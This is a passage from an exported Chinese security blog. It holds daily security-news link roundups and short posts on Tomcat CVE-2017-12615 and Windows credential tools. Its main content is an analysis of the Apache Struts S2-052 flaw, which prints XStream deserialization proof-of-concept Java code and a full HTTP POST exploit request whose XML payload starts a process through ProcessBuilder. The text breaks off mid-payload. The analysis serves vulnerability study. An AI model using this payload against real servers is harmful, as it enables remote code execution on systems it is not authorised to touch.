DerbyCon 2017 会议的演讲。之前推送过他在微软 Blog 上写过的两篇相关文章https://github.com/zacbrown/hiddentreasure-etw-demo/blob/master/zbrown-HiddenTreasureETW-DerbyCon7.pdf其它 在 linux 下使用 CMake 构建应用程序https://www.ibm.com/developerworks/cn/linux/l-cn-cmake/ 64-bit version of Boost for 64-bit windowshttps://stackoverflow.com/questions/2322255/64-bit-version-of-boost-for-64-bit-windows 查看lib是32位还是64位的“C:\Program Files\Microsoft Visual Studio\VC98\Bin\DUMPBIN.EXE” C:\boost_1_65_0\lib32-msvc-14.0\boost_atomic-vc140-mt-1_65.lib /headers*.lib | findstr machine]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170926安全动态]]></title>
    <url>%2F2017%2F09%2F26%2F20170926%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 ROP介绍&#104;&#116;&#x74;&#x70;&#115;&#58;&#x2f;&#47;&#109;&#x65;&#100;&#105;&#x75;&#x6d;&#x2e;&#x63;&#111;&#109;&#47;&#64;&#x69;&#115;&#x65;&#x65;&#116;&#x68;&#105;&#x65;&#x76;&#x65;&#x73;&#47;&#x69;&#x6e;&#x74;&#x72;&#111;&#45;&#x74;&#111;&#x2d;&#x72;&#111;&#112;&#45;&#x72;&#111;&#112;&#45;&#x65;&#109;&#112;&#111;&#x72;&#x69;&#117;&#109;&#45;&#x73;&#x70;&#108;&#105;&#x74;&#x2d;&#57;&#98;&#50;&#101;&#x63;&#54;&#x64;&#52;&#x64;&#x62;&#48;&#x38; Biting the Apple that feeds you（咬一口嘴边的苹果） - macOS 内核的 Fuzzing，来自 MWR Labs 在 44CON 会议的演讲https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-44con-biting-the-apple-that-feeds-you-2017-09-25.pdf High Sierra macOS 系统中，未签名的程序通过编程可以导出 keychain 中的明文密码https://twitter.com/i/web/status/912254053849079808 macOS High Sierra 10.13 安全更新内容https://support.apple.com/en-us/HT208144 寻找内存驻留的恶意软件http://www.irongeek.com/i.php?page=videos/derbycon7/s21-hunting-for-memory-resident-malware-joe-desimone SSL/TLS layers for scapy the interactive packet manipulation toolhttps://github.com/tintinweb/scapy-ssl_tls BaRMIe - Java RMI枚举和攻击工具https://github.com/NickstaDB/BaRMIe BLE – 一款 BLE 扫描器https://github.com/evilsocket/bleah PyMLProjects: Python 机器学习项目https://github.com/k3170makan/PyMLProjects redsails - 一个基于 Python 的后渗透项目，旨在绕过基于主机的安全监控与日志记录https://github.com/BeetleChunks/redsails 从核心概念和技术层面着眼，系统化认识RPChttps://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2650997997&amp;idx=1&amp;sn=cdcd04fb6c5f2e6deb4b0ae89102ddf8&amp;amp Sysmon v6.10 VS WMI Persistencehttps://rawsec.lu/blog/posts/2017/Sep/19/sysmon-v610-vs-wmi-persistence/ NodeJS Debugger 命令注入https://packetstormsecurity.com/files/144333 谷歌测试5款主流浏览器 Safari最不安全 Don’t Google ‘PowerShell Hunting’https://www.youtube.com/watch?v=1mfVPLPxKTc]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170925安全动态]]></title>
    <url>%2F2017%2F09%2F25%2F20170925%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 使用Kerberoast破解Kerberos TGS票据：利用Kerberos突破活动目录域http://bobao.360.cn/learning/detail/4256.html beef+msf实现内网渗透https://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651865513&amp;idx=1&amp;sn=7b6fe6d129896b80da6a5e458416ee29&amp;chksm=8442b94eb335305847276fffdbd9bd998a6f84fb282facf6d81fa82cc49cb7657194d478f33e&amp;mpshare=1&amp;scene=23&amp;srcid=0925P5WOPLnnpM8uarmiKnj9#rd 向运行的Python进程中注入代码https://github.com/lmacken/pyrasite 我是如何拿到google 13337刀赏金的https://thesecurityexperts.wordpress.com/2017/09/24/how-i-got-13337-bounty-from-google/ DerbyCon 2016 会议的一篇演讲《Better Network Defense Through Threat Injection and Hunting》https://zachgrace.com/public/presentations/DerbyCon_2016_ZG_BG.pdf DerbyCon 2017 会议一篇关于威胁检测的议题《Purpose Driven Hunt》https://www.slideshare.net/JaredAtkinson/purpose-driven-hunt-derbycon-2017/1 Wink 和 Insteon 的智能家居设备存在多个漏洞https://blog.rapid7.com/2017/09/22/multiple-vulnerabilities-in-wink-and-insteon-smart-home-systems/ FinFisher 正在 ISP 级别发起中间人劫持攻击，用木马感染文件下载https://www.welivesecurity.com/2017/09/21/new-finfisher-surveillance-campaigns/ Blaze’s Security Blog 对一个恶意广告点击网络的分析https://bartblaze.blogspot.fr/2017/09/malicious-adclick-networks-common-or.html 过期的域名在渗透测试团队手里有大用处http://threatexpress.com/2017/03/leveraging-expired-domains-for-red-team-engagements/ 在 Windows Shellcode 中对 32 位和 64 位架构的判断https://osandamalith.com/2017/09/24/detecting-architecture-in-windows/ Batch, attach and patch: using windbg’s local kernel debugger to execute code in windows kernel。 利用 WinDbg 的本地内核调试器在 Windows 内核中执行代码https://vallejo.cc/2015/06/07/batch-attach-and-patch-using-windbgs-local-kernel-debugger-to-execute-code-in-windows-kernel/ 不是安全边界，Bypass UAChttps://www.slideshare.net/enigma0x3/not-a-security-boundary-bypassing-user-account-control 来自 DerbyCon 会议的演讲《Beyond xp_cmdshell: Owning the Empire through SQL Server 》https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server Derbycon 2017 会议的演讲 《Windows Rootkit 开发 - 从 Python 原型实现到内核态的 C&amp;C》http://www.irongeek.com/i.php?page=videos/derbycon7/t310-windows-rootkit-development-python-prototyping-to-kernel-level-c2-rj-mcdown 来自 DerbyCon 会议的演讲《Here Be Dragons: The Unexplored Land of Active Directory ACLs》https://www.slideshare.net/AndyRobbins3/here-be-dragons-the-unexplored-land-of-active-directory-acls]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170922安全动态]]></title>
    <url>%2F2017%2F09%2F22%2F20170922%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Python 对象注入漏洞利用http://defencely.com/blog/defencely-clarifies-python-object-injection-exploitation/ Ticket Trick - 利用企业邮箱登陆功能潜入企业内部网络，大量企业受影响https://medium.freecodecamp.org/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c LiMEaide - 基于 Python 实现的远程转储 Linux 客户端 RAM 工具https://github.com/kd8bny/LiMEaide Python沙箱逃逸的n种姿势https://xianzhi.aliyun.com/forum/read/2138.html 如何枚举Windows中的进程、线程以及映像加载通知回调例程http://bobao.360.cn/learning/detail/4459.html 针对联网智能灯泡的安全性分析https://www.contextis.com/blog/hacking-into-internet-connected-light-bulbs CVE-2016-10190详细分析 ffmpeghttps://nandynarwhals.org/cve-2016-10190/ dorkbot:Command-line tool to scan Google search results for vulnerabilitieshttps://github.com/utiso/dorkbot Linux应急响应姿势浅谈https://xianzhi.aliyun.com/forum/read/2150.html EternalPot — Lessons from building a global Nation State SMB exploit honeypot infrastructurehttps://doublepulsar.com/eternalpot-lessons-from-building-a-global-nation-state-smb-exploit-honeypot-infrastructure-3f2a0b064ffe Python PyYAML反序列化漏洞实验和Payload构造http://www.polaris-lab.com/index.php/archives/375/ .NET反序列化Payload生成https://github.com/pwntester/ysoserial.net HACK THE HACKER – FUZZING MIMIKATZ ON WINDOWS WITH WINAFL &amp; HEATMAPS (0DAY)https://www.sec-consult.com/en/blog/2017/09/hack-the-hacker-fuzzing-mimikatz-on-windows-with-winafl-heatmaps-0day/index.html?from=timeline&amp;isappinstalled=0 基于Python的TCP后门https://github.com/TheBlaCkCoDeR09/Python_Reverse_TCP Optionsbleed实践https://www.securitysift.com/testing-optionsbleed/ ISQL LINUX SQL管理工具缓冲区溢出漏洞https://whereisk0shl.top/post/2017-09-23 HTML HELP WORKSHOP .SEH本地代码执行漏洞https://whereisk0shl.top/post/html-help-workshop-.sehben-di-dai-ma-zhi-xing-lou-dong [质量局!!]HITB GSEC CTF WIN PWN解题全记录之BABYSTACKhttps://whereisk0shl.top/post/hitb_gsec_ctf_babystack_writeup [CVE-2014-6287]REJETTO HTTP FILE SERVER远程命令执行漏洞分析https://whereisk0shl.top/post/cve-2014-6287-rejetto-http-file-serveryuan-cheng-ming-ling-zhi-xing-lou-dong-fen-xi [MS12-077]IE10 CMARKUP USE AFTER FREE漏洞分析https://whereisk0shl.top/post/ms12-077-ie10-cmarkup-use-after-freelou-dong-fen-xi PROFTPD-1.3.3C后门分析https://whereisk0shl.top/post/proftpd-1.3.3chou-men-fen-xi JCG路由命令执行漏洞分析https://whereisk0shl.top/post/jcglu-you-ming-ling-zhi-xing-lou-dong-fen-xi dnscat2 - Create an Encrypted Command &amp; Control (C&amp;C) Channel over the DNS Protocolhttp://www.kitploit.com/2017/09/dnscat2-create-encrypted-command.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[Tomcat 远程代码执行漏洞(CVE-2017-12615)以及信息泄露漏洞(CVE-2017-12616)]]></title>
    <url>%2F2017%2F09%2F21%2FTomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-12615-%E4%BB%A5%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2017-12616%2F</url>
    <content type="text"><![CDATA[前言复现 测试环境 首先修改conf/web.xml文件，如下修改完成之后重启tomcat服务器 put上传文件 测试原理 待更CVE-2017-12616 ​信息泄露漏洞小结 说实话，没事儿去修改readonly为false的应该不多，所以漏洞影响有限。Reference https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5&amp;chksm=ea3f3dd9dd48b4cf1db66e70662126cf1eb45f60eb8205b3391d20f66564e6a789b158c0efe5&amp;mpshare=1&amp;scene=23&amp;srcid=0921nOtxiMml2bGoVXM9jKMS#rd http://www.freebuf.com/vuls/148283.html https://mp.weixin.qq.com/s?__biz=MzI5Nzc0OTkxOQ==&amp;mid=2247483712&amp;idx=1&amp;sn=c92d1abc41c6a8293c83ff4913b214a4&amp;chksm=ecb11db0dbc694a62d5d073054d0bf41b2ab5680807f19a3357a82fcb4ba72883cf97e9b4321&amp;mpshare=1&amp;scene=23&amp;srcid=0921koVmEUnPZyCRatqKTka3#rd]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170921安全动态]]></title>
    <url>%2F2017%2F09%2F21%2F20170921%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 针对 NFS 的渗透测试https://pentestacademy.wordpress.com/2017/09/20/nfs/ Joomla! &lt;= 3.7.5 LDAP 注入漏洞详情（CVE-2017-14596）https://blog.ripstech.com/2017/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/ retire.js - 一款用于检测 JavaScript 库是否存在已知漏洞的工具https://github.com/RetireJS/retire.js racer - 一键式应用，可用于测试条件竞争https://github.com/sakurity/racerhttps://github.com/insp3ctre/race-the-webhttp://racetheweb.io/bank 1这个不错值得研究一下。 滥用 DLL 延迟加载实现远程代码注入http://hatriot.github.io/blog/2017/09/19/abusing-delay-load-dll/ Tomcat 远程代码执行漏洞分析（CVE-2017-12615）及补丁 Bypass，来自腾讯云鼎实验室的分析http://www.freebuf.com/vuls/148283.html 蓝牙协议 Android 信息泄露漏洞 (CVE-2017-0785/Blueborne) 的 PoChttps://github.com/ojasookert/CVE-2017-0785 CVE-2016-10191 FFmpeg RTMP Heap Buffer Overflow 漏洞分析及利用，来自 蚂蚁金服巴斯光年安全实验室http://jaq.alibaba.com/community/art/show?articleid=1074 Burp Suite被曝存在远程代码执行漏洞http://bobao.360.cn/news/detail/4334.html Windows内核池喷射的乐趣http://bobao.360.cn/learning/detail/4439.html java反序列化的漏洞https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/ DenyAll WAF远程代码执行漏洞https://pentest.blog/advisory-denyall-web-application-firewall-unauthenticated-remote-code-execution/ 打破Windows环境的限制https://weirdgirlweb.wordpress.com/ 应急响应案例分析与经验分享http://blog.nsfocus.net/emergency-response-case-study/其它 vscode的evernote插件https://github.com/michalyao/evermonkey1现在的evernote的开发者token暂时不能用了:(]]></content>
  </entry>
  <entry>
    <title><![CDATA[windows认证机制以及常见密码获取工具分析]]></title>
    <url>%2F2017%2F09%2F20%2Fwindows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[概述 先来了解一下lsass进程。Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.link NTLM KerberosCrackCrack windows Admin Password and Sam FilesThe NTLM Authentication Protocol and Security Support Providermimikatz 内存导出 从本地获取密码Reference https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx http://blog.csdn.net/qq_26886929/article/details/53905654 http://blog.csdn.net/wulantian/article/details/42418231 https://github.com/gentilkiwi/mimikatz/wiki]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170920安全动态]]></title>
    <url>%2F2017%2F09%2F20%2F20170920%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 我如何使用Cloud Fuzzing挖到了一个Tcpdump漏洞http://www.freebuf.com/articles/network/147955.html Introducing pywintrace: A Python Wrapper for ETWhttps://www.fireeye.com/blog/threat-research/2017/09/pywintrace-python-wrapper-for-etw.html 如何搭建一个便携式蜂窝网络 如何设计一个系统，能够抵抗住 Apache Struts S2-045（CVE-2017-5638）漏洞攻击 如何搭建一个分布式 Web 爬虫系统https://benbernardblog.com/the-tale-of-creating-a-distributed-web-crawler/ smbmap：用于SMB枚举的工具https://github.com/ShawnDEvans/smbmap Detecting debuggers by abusing a bad assumption within Windowshttp://www.triplefault.io/2017/08/detecting-debuggers-by-abusing-bad.html 5 tips for enterprises to ensure their SMB partners don’t cause a data breachhttp://www.techrepublic.com/article/5-tips-for-enterprises-to-ensure-their-smb-partners-dont-cause-a-data-breach/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170919安全动态]]></title>
    <url>%2F2017%2F09%2F19%2F20170919%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 《 The Python Bites your Apple：Fuzzing and exploiting OSX Kernel bugs》，《蛇噬汝果：基于Python的OSX内核漏洞模糊测试挖掘和利用》，来自科恩实验室 Flanker 在 XKungfoo 2016 会议的演讲https://papers.put.as/papers/macosx/2016/xkungfoo.pdf 恶意 Chrome 插件分析https://blog.0day.rocks/malicious-chrome-extension-meddling-with-your-searches-581aa56ddc9c 探测 mimikatz 以及其他可疑的 lsass 访问 - Part 1https://www.eideon.com/2017-09-09-THL01-Mimikatz/ RDP劫持 - 如何透明地劫持 RDS 和 RemoteApp 会话&#x68;&#x74;&#116;&#x70;&#x73;&#58;&#47;&#47;&#109;&#101;&#100;&#x69;&#x75;&#x6d;&#x2e;&#99;&#111;&#x6d;&#47;&#64;&#110;&#101;&#116;&#x77;&#x6f;&#114;&#x6b;&#115;&#x65;&#99;&#117;&#114;&#105;&#116;&#x79;&#x2f;&#x72;&#100;&#112;&#45;&#x68;&#105;&#106;&#97;&#99;&#x6b;&#105;&#x6e;&#x67;&#x2d;&#x68;&#x6f;&#119;&#45;&#116;&#111;&#45;&#104;&#x69;&#106;&#x61;&#x63;&#107;&#45;&#x72;&#x64;&#115;&#x2d;&#97;&#110;&#100;&#x2d;&#114;&#101;&#x6d;&#111;&#x74;&#101;&#x61;&#112;&#112;&#45;&#115;&#101;&#x73;&#x73;&#x69;&#111;&#x6e;&#x73;&#x2d;&#116;&#x72;&#x61;&#x6e;&#115;&#112;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x6c;&#x79;&#45;&#x74;&#111;&#x2d;&#109;&#x6f;&#x76;&#x65;&#45;&#x74;&#104;&#x72;&#x6f;&#117;&#x67;&#x68;&#45;&#97;&#110;&#x2d;&#100;&#x61;&#50;&#x61;&#x31;&#x65;&#x37;&#51;&#97;&#53;&#102;&#54;&#x3f;&#x73;&#x6f;&#x75;&#114;&#x63;&#101;&#x3d;&#108;&#105;&#x6e;&#107;&#83;&#x68;&#x61;&#x72;&#x65;&#x2d;&#55;&#100;&#x62;&#54;&#x64;&#50;&#x64;&#x66;&#52;&#x32;&#x61;&#x36;&#45;&#49;&#x35;&#x30;&#53;&#54;&#x38;&#54;&#x31;&#x35;&#50; Microsoft Office 有哪些特性可以被后门用来实现常驻（Persist），来自 MWR Labshttps://labs.mwrinfosecurity.com/assets/BlogFiles/WilliamKnowles-MWR-44con-PersistingWithMicrosoftOffice.pdf JSLinux - 在浏览器里运行 Linux 系统https://bellard.org/jslinux/ idahunt - NCCGroup 开源的用于辅助 IDA Pro 逆向分析的工具，譬如批量分析二进制文件https://github.com/nccgroup/idahunt Active Directory ACL 的攻与防https://blogs.technet.microsoft.com/enterprisemobility/2017/09/18/active-directory-access-control-list-attacks-and-defense/ Windows 系统中进程、线程的枚举以及 Image 加载通知的回调http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html Empire中的Invoke-WScriptBypassUAC利用分析https://3gstudent.github.io/3gstudent.github.io/Empire%E4%B8%AD%E7%9A%84Invoke-WScriptBypassUAC%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/ OAuth 2.0 标准实现中的常见漏洞https://blog.avuln.com/article/4 Linux攻击面分析]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170918安全动态]]></title>
    <url>%2F2017%2F09%2F18%2F20170918%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 游戏辅助背后的黑产流水线：年劫持攻击千万次牟利数百万http://www.freebuf.com/articles/network/147652.html 理解 V8 字节码https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775 v8 引擎实现了 Type profiling，可在运行时收集类型信息https://medium.com/fhinkel/runtime-type-information-for-javascript-b134faac3c0a 反取证技术 - 将进程隐藏在内核模式中https://www.cert-devoteam.fr/publications/en/antiforensics-techniques-process-hiding-in-kernel-mode/ 在 PyPI(Python包索引) 上发现十个恶意的库https://www.bleepingcomputer.com/news/security/ten-malicious-libraries-found-on-pypi-python-package-index/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1505552853415 macphish - 生成 Office for Mac 宏 Payload 的工具https://github.com/cldrn/macphish Windows kernel pool spraying funPart 3 : https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-3.html Part 2：https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-2.html Part 1： https://theevilbit.blogspot.in/2017/09/pool-spraying-fun-part-1.html 一次服务器被攻击的应急行动http://www.4hou.com/technology/7653.html Xdebug: A Tiny Attack Surfacehttps://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface 利用 WinAFL 来 fuzz MSXML libraryhttps://symeonp.github.io/2017/09/17/fuzzing-winafl.html An Introduction to Printer Exploitation #1https://0x00sec.org/t/an-introduction-to-printer-exploitation-1/3565 除了拖拽（Drag’n’Drop），VMware 还有哪些攻击面？Comsecuris 去年为了准备 Pwn2Own 开始挖掘 VMware 的漏洞，可惜最后由于时间原因没能赶上。这篇 Blog 来自他们对 Vmware 攻击界面的剖析以及他们发现的漏洞https://comsecuris.com/blog/posts/vmware_vgpu_shader_vulnerabilities/ pyDHE：一个完整的Python Diffie-Hellman库https://github.com/deadPix3l/pyDHE 在Windows中枚举进程，线程和映像加载通知回调例程http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html 针对Flash应用程序的渗透测试https://privsec.blog/penetration-testing-flash-apps-aka-how-to-cheat-at-blackjack/ githubscan：GitHub敏感信息扫描工具https://github.com/lianfeng30/githubscan 挖漏洞的高级方法http://jackson.thuraisamy.me/finding-vulnerabilities.html LaZagne：浏览器密码凭证获取https://github.com/AlessandroZ/LaZagne 1很早就关注的一个项目了，还一直在更新。 CVE-2016-0040：Privilege Escalation Exploit For WMI Receive Notification Vulnerability (x86-64)]]></content>
  </entry>
  <entry>
    <title><![CDATA[struts-052和struts-053分析]]></title>
    <url>%2F2017%2F09%2F17%2Fstruts-052%E5%92%8Cstruts-053%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[前言漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。 s2-052漏洞war包下载官方通告在分析这个漏洞之前，先补补基础知识。了解一下xstream这个包，看一下官方的一句话介绍，XStream is a simple library to serialize objects to XML and back again.就是一个序列化java对象为xml以及将xml反序列化为java对象。我之前分析过json序列化和反序列化时常用的几种方法，今天我也学习一下xml序列化和反序列化的方法，目前来说有两种，一种是XMLDecoder，另外一下是使用xstream，xstream使用的比较早的多，然后这次的s2-052就是利用的xstream。xstream反序列化的问题由来已久，早在四年前，老外就在defcon中讲述了这个问题link，而且之前jenkins的反序列化漏洞也是和xstream有关。我们可以看到，通过XMLGenerator.generateXML的方法就进行了序列化，而通过XMLGenerator.generateTOfromXML就进行了反序列化。这个XMLGenerator类的代码如下：123456789101112131415161718192021222324252627282930313233343536import com.thoughtworks.xstream.XStream;import com.thoughtworks.xstream.io.xml.DomDriver;public final class XMLGenerator &#123;/* * this class is for generating XML */ /* * initialization of XStream class */ private static XStream xstream = new XStream(new DomDriver()) &#123;&#123; processAnnotations(Square.class); processAnnotations(Rectangle.class); &#125;&#125;; /* * This class is for generating XML from MODEL class * @param Object * @return String */ public static String generateXML(Object to) &#123; return null == to ? &quot;&quot; : xstream.toXML(to); &#125; /* * Generates the transfer object from the given XML using XStream. * * @param String * @return transfer object */ public static Object generateTOfromXML(String xml) &#123; return xstream.fromXML(xml); &#125; &#125; 这里就用到了XStream。现在我们再来看一下这样的代码1234567891011121314151617181920212223242526272829import com.thoughtworks.xstream.XStream;import com.thoughtworks.xstream.io.xml.DomDriver;public class xstreamPOC &#123; public static void main(String[] args) &#123;// String payload = &quot;&lt;square&gt;&quot;+ // &quot; &lt;size&gt;5&lt;/size&gt;&quot;+// &quot;&lt;/square&gt; &quot;; String payload = &quot;&lt;string&gt;&quot;+ &quot; hello&quot;+ &quot;&lt;/string&gt; &quot;; String inputXML = payload; //Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML); //the next code is what the XMLGenerator.generateTOfromXML is doing: XStream xstream = new XStream(new DomDriver()) &#123;&#123; processAnnotations(Square.class); processAnnotations(Rectangle.class); &#125;&#125;; Square sq1 = (Square)xstream.fromXML(inputXML); System.out.println(String.format(&quot;sq1: \n \n%s \n\n&quot;, sq1)); &#125;&#125; 从上图可以看到，当我在序列化一个包含有string关键字的xml时候，他会首先产生一个string的类，然后强制转换成Square类。危险就为危险在这里了，XStream将创建定义在xml中的对象。那么如果我们换成下面的payload呢123String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ &quot; &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+ &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;; 可以看到我们就会实例化这个ProcessBuilder这个类。但是呢，目前为止我们还是只能创建对象，并不能invoke他们，所以这个时候就需要动态代理和EventHandle这两个技巧了。看下面这样的代码，1234567891011121314151617181920212223242526272829import java.beans.EventHandler;import java.util.Set;import java.util.TreeSet;public class XStreamPoC &#123; public static void main(String[] args) &#123; Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;(); set.add(&quot;foo&quot;); set.add(EventHandler.create(Comparable.class, new ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;)); String setXml = XMLGenerator.generateXML(set); /*String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ &quot; &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+ &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;; String inputXML = payload; Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML); //Object sq1 = XMLGenerator.generateTOfromXML(inputXML); System.out.println(String.format(&quot;sq1 value: %s \n\nsq1 class: %s&quot;, sq1, sq1.getClass())); */ &#125;&#125; 如上图所示，可以看到当转换发生异常的时候,就会执行start的操作。介于此，我们的payload就可以这么写了。12345678910111213141516171819202122232425262728293031import java.io.IOException;public class PoC_XMLGenerator &#123; public static void main(String[] args) &#123; // TODO Auto-generated method stub String process = &quot;open&quot;; String arguments = &quot;/Applications/Calculator.app&quot;; String payload = &quot;&lt;sorted-set&gt;&quot; + //&quot;&lt;string&gt;foo&lt;/string&gt;&quot; + &quot;&lt;dynamic-proxy&gt;&quot; + &quot;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&quot; + &quot;&lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;&quot; + &quot; &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;&quot; + &quot; &lt;command&gt;&quot; + &quot; &lt;string&gt;&quot; + process + &quot;&lt;/string&gt;&quot; + &quot; &lt;string&gt;&quot; + arguments + &quot;&lt;/string&gt;&quot; + &quot; &lt;/command&gt;&quot; + &quot; &lt;/target&gt;&quot; + &quot; &lt;action&gt;start&lt;/action&gt;&quot; + &quot;&lt;/handler&gt;&quot; + &quot;&lt;/dynamic-proxy&gt;&quot; + &quot;&lt;/sorted-set&gt;&quot;; XMLGenerator.generateTOfromXML(payload); System.out.println(&quot;Will not get here&quot;); &#125;&#125; 至此，XStream的利用点分析完了。下面再来看看struts2中的利用。通过官方的一句话公告 A RCE attack is possible when using the Struts REST plugin with XStream handler to deserialise XML requests可以看出问题出在struts rest plugin，这个REST插件struts2-rest-plugin.jar用到了XStreamHandler这个类，这个类对http请求中content-type是application/xml的，会调用XStream进行处理。可以看到，当contenttype为xml的时候的处理类是XStreamHandler。那么我们就可以将恶意代码以xml为载体，通过Content-type为xml的方式，让XStreamHandler去进行序列化，那么这个时候就会触发漏洞。最终payload如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364POST /struts2-rest-showcase/orders/3 HTTP/1.1Host: localhost:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/xmlContent-Length: 2430&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;/Applications/Calculator.app&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString 